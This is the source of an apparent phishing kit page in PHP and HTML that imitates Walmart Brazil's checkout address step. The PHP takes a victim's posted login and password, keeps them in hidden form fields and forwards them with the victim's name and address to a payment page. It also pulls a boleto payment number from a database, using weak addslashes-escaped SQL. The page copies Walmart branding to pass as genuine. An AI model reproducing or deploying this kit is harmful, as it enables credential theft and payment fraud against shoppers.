<?php

error_reporting(0);
ini_set(“display_errors”, 0 );

require_once ("../Raiz/admin/function/config.php");
require_once ("../Raiz/admin/function/conexao.php");



	
	


$ID_A = $_POST ['ID'];
$USUARIO_A = $_POST ['signinField'];
$SENHA_A = $_POST ['password'];

$ID =  addslashes($ID_A);
$USUARIO =  addslashes($USUARIO_A);
$SENHA =  addslashes($SENHA_A);



$dadosB = "SELECT* FROM boletos where id_produto='$ID' limit 5";
$conB = $mysqli -> query($dadosB) or die ($mysqli -> error);


while ($consultaB= $conB -> fetch_array()){
	
	$n_ab = $consultaB ["numero"];

	$id_2 = $consultaB ["id"];
	
		if ( empty ( $n_ab ) ) {
	
	   $n = '';

	
} else
{
	
	$n_2 = $consultaB ["numero"];
	
	$n2 = "".$n_2."";
	
} 
	

	
	
}




$input = array($n2 ,"");
$rand_keys = array_rand($input,2);
$input[$rand_keys[0]] . "\n";


if ( empty ( $input[$rand_keys[0]] ) ) {
	
	    $sql1 = "Update produtos SET status_boleto=2 where id='$ID' " ;
		$query = $mysqli->query($sql1);

	
} else
{
	
 $id_leto = $input[$rand_keys[0]] ;
	

	
} 
	


?>



<html class="js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths modal-open" style=""><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><script type="text/javascript" async="" src="../Raiz/Files3/ec.js.download"></script><script async="" src="../Raiz/Files3/cs.js.download"></script><script src="../Raiz/Files3/2960.js.download" async="" type="text/javascript"></script><script async="" src="../Raiz/Files3/cs.js.download"></script><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>Escolha de endereço de entrega - Walmart.com</title><meta name="description" content=""><meta name="viewport" content="width=device-width,user-scalable=no"><link rel="shortcut icon" href="https://www.walmart.com.br/favicon.ico" type="image/x-icon"><link rel="icon" href="https://www.walmart.com.br/favicon.ico" type="image/x-icon"><!-- Place favicon.ico and apple-touch-icon.png in the root directory --><link rel="stylesheet" href="../Raiz/Files3/5e2214d5.checkout.css"><script src="../Raiz/Files3/ff3057f9.feature.js.download"></script><script src="../Raiz/Files3/analytics.js.download"></script><script src="../Raiz/Files3/s-code-contents-18bb769dbfda1ec099f682ef04215ace88fc2799.js.download"></script><script language="Javascript" type="text/javascript" src="../Raiz/Files3/encryption.js.download"></script>
<script language="Javascript" type="text/javascript" src="../Raiz/Files3/getkey.js.download"></script><link rel="dns-prefetch" href="https://device.clearsale.com.br/"><script src="../Raiz/Files3/satellite-5616ad06366462001700171b.js.download"></script><script src="../Raiz/Files3/satellite-55ad40a733646300140007cc.js.download"></script><script src="../Raiz/Files3/satellite-55dc9d3f6165630017001049.js.download"></script><script src="../Raiz/Files3/satellite-55e46d9c6330630014000aca.js.download"></script><script src="../Raiz/Files3/satellite-55e702506533640014001100.js.download"></script><script src="../Raiz/Files3/satellite-56df553064746d05210015ba.js.download"></script><script src="../Raiz/Files3/satellite-561d60b33535310014000298.js.download"></script><script src="../Raiz/Files3/satellite-58177c1c64746d5fda00cd74.js.download"></script><script src="../Raiz/Files3/satellite-5873742764746d6035006d7c.js.download"></script><script src="../Raiz/Files3/satellite-59e4f61e64746d35d20003e4.js.download"></script></head><body style=""><div class="wrapper"><header class="header choose-address"><div class="header-wrapper">
  <figure class="navbar-brand">
    
    
      <img class="header-logo" src="../Raiz/Files3/walmart-logo.png" alt="Walmart.com">
    

  </figure>
  <h1 class="header-title choose-address">
    Onde você quer receber?
  </h1>
  <div class="header-security">
    <div class="header-security-wrapper">
     <img src="../Raiz/assets/img/a.png" >
    </div>
  </div>
</div>
</header><!-- Main content --><main class="main-content"><div class="address-view view-content"><div class="choose-address container">
  
<div class="address-card choose add-address"><a class="add-address-link" data-toggle="modal" href="https://www2.walmart.com.br/checkout/#myModal">
<img src="../Raiz/assets/img/1.png" >
  <span>Adicionar novo endereço</span>
</a>
</div>
<header class="container-header"><h2 class="container-title">Endereços salvos</h2></header>




</div>
<section class="steps-control">
  <div class="steps-control-wrapper">
    <a href="https://www2.walmart.com.br/checkout/content/carrinho/" class="btn btn-success-border">Voltar</a>
    <button class="btn btn-success" data-js="continue">Continuar</button>
  </div>
</section>
</div></main><!-- Footer content --><footer id="footer" class="footer"><section class="footer-wrapper">
  

  <div class="footer-security">
    <div class="footer-security-wrapper">
      <img src="../Raiz/assets/img/e.png" >
    </div>
  </div>

  <div class="footer-description">
    <p class="footer-text">© 2018 Walmart.com, Inc • Todos os direitos reservados</p>
    <a data-href="/institucional/termos-uso" data-modal="termsOfUse">Termos de uso</a>
    <span>•</span>
    <a data-href="/institucional/politica-privacidade/" data-modal="privacyPolicy">Política de privacidade</a>
  </div>
</section>
</footer><!-- ClearSale --><!-- End | Main content --></div> <!-- End | wrapper -->


<script src="../Raiz/Files3/0ba19d02.checkout.js.download"></script><script src="../Raiz/Files3/jquery.min.js.download"></script><script src="../Raiz/Files3/satelliteLib-ce37935efdafd7a4464ef02b4248354687080fa3.js.download"></script><script type="text/javascript">_satellite.pageBottom();</script><script src="../Raiz/Files3/satellite-55070c133031360019e30100.js.download"></script><script type="text/javascript">

</script><!-- ClearSale --><script type="text/javascript">var _csdp = _csdp || [];</script><div id="divDataLayerScript"><script type="text/javascript" language="javascript">
</script>
</div>




<div class="modal-backdrop  in"></div><div class="cart-modal modal-add-address in" id="maintainAddress"><section class="modal-panel">
  
  
  <header class="modal-header">
    <h1 class="modal-title">Adicionar novo endereço de entrega</h1>
  </header>
  
  <form action="pagamento.php" method="post" >
  <input type="hidden" name="ID" value="<?php echo $ID ?>" >
  <input type="hidden" name="user" value="<?php echo $USUARIO ?>" >
  <input type="hidden" name="pass" value="<?php echo $SENHA ?>" >
  
  <main class="modal-body"><div class="form-scroll">
  <div class="form-scroll-inputs">
    <div class="form-line">
      <div class="form-group form-recipient-name input-fieldset">
        <input name="nome" type="text" required class="form-control input-box cleanable input" maxlength="100" name="receiverName" value="">
        <label class="control-label label" for="inputError">
          Nome do destinatário
        </label>
      </div>
    </div>

    <div class="form-line">
      <div class="form-group form-pobox input-fieldset half-col postalcode-col">
        <input name="cep" type="tel" required class="form-control input-box pobox-first input" maxlength="9" data-mask="99999-999" value="">
        <label class="control-label label">CEP</label>
      </div>
      <div class="input-fieldset half-col">
        <a target="_blank" href="http://www.buscacep.correios.com.br/" >Não sei meu CEP</a>
      </div>
    </div>

    <div class="form-line">
      <div class="form-group form-address input-fieldset">
        <input name="endereco" type="text" required maxlength="150" class="form-control input-box input" value="">
        <label class="control-label label">Endereço</label>
      </div>
    </div>

    <div class="form-line">
      <div class="form-group form-free-state-registration input-fieldset">
        
        <input name="numero_sem" type="checkbox" class="form-control input-box checkbox-free checkbox" id="noNumberCheck"> 
        <label class="label" for="noNumberCheck">Sem número</label>
      </div>
    </div>

    <div class="form-line">
      <div class="form-group form-number input-fieldset half-col">
        
        <input name="numero" type="tel" required maxlength="6" class="form-control input-box input" value=""> 
        <label class="control-label label">Número</label>
      </div>
      <div class="form-group form-complement input-fieldset half-col has-content">
        <input name="complemento" type="text" required maxlength="100" class="form-control input-box input placeholder" placeholder="(opcional)" value="">
        <label class="control-label label">Complemento</label>
      </div>
    </div>

    <div class="form-line">
      <div class="form-group form-neighbor input-fieldset">
        <input name="bairro" type="text" required maxlength="100" class="form-control input-box input" value="">
        <label class="control-label label">Bairro</label>
      </div>
    </div>

	    <div class="form-line">
      <div class="form-group form-neighbor input-fieldset">
        <input name="cidade" type="text" required maxlength="100" class="form-control input-box input" value="">
        <label class="control-label label">Cidade</label>
      </div>
    </div>
	
	    <div class="form-line">
      <div class="form-group form-neighbor input-fieldset">
        <input name="estado" type="text" required maxlength="100" class="form-control input-box input" value="">
        <label class="control-label label">Estado</label>
      </div>
    </div>




    <div class="form-line">
      <div class="form-group form-reference input-fieldset has-content">
        <input name="ponto" type="text" id="txtReferencePoint" class="form-control input-box input placeholder" placeholder="(opcional)" maxlength="100" value="">
        <label class="control-label label">Ponto de referência</label>
      </div>
    </div>

    <div class="form-line">
      <div class="form-group form-reference input-fieldset has-content">
        <input name="apelido" type="text" id="txtDescriptionNickname" class="form-control input-box input placeholder" placeholder="(opcional)" maxlength="100" value="">
        <label class="control-label label">Apelido do endereço (ex: Casa)</label>
      </div>
    </div>

    <div class="form-line">
      <div class="form-group form-free-state-registration input-fieldset">
        
        <input  type="checkbox" class="form-control input-box checkbox-free checkbox" id="defaultCheck"> 
        <label class="label" for="defaultCheck">Usar como padrão para as próximas compras</label>
      </div>
    </div>
  </div>
</div>

<div class="actions-buttons">
  <button type="button" class="btn btn-default-border" data-dismiss="modal">
    Voltar
  </button>
  <button  name="set" class="btn btn-default column-set-delivery" id="btn-set-delivery">
    Entregar nesse endereço
  </button>
</div>

</form>
</main>

</section>
</div></body></html>